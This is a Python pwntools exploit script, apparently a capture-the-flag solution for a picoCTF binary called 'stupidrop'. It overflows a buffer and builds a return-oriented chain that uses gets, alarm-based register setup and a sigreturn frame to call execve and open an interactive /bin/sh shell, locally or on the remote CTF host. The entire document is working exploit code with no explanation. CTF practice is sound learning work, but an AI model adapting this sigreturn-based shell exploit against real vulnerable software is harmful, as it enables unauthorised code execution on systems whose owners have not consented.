#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./stupidrop", checksec=False)
libc = exe.libc

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x40063C
        b*alarm+0xb
        c
	''')
#input()

pop_rdi = 0x00000000004006a3
syscall = 0x000000000040063e

frame = SigreturnFrame()
frame.rdi = exe.bss(400)
frame.rsi = 0
frame.rdx = 0
frame.rax = 0x3b
frame.rsp = exe.bss()
frame.rbp = exe.bss()
frame.rip = syscall

payload = b'A'*48 + p64(exe.bss())
payload += p64(pop_rdi) + p64(exe.bss(400)) + p64(exe.sym['gets'])
payload += p64(pop_rdi) + p64(0xf) + p64(exe.sym['alarm'])
payload += p64(pop_rdi) + p64(0) + p64(exe.sym['alarm'])
payload += p64(syscall)
payload += bytes(frame)

sl(payload)
sl(b"/bin/sh")

p.interactive()


#0x00000000004006a3 : pop rdi ; ret
#0x000000000040063e : syscall
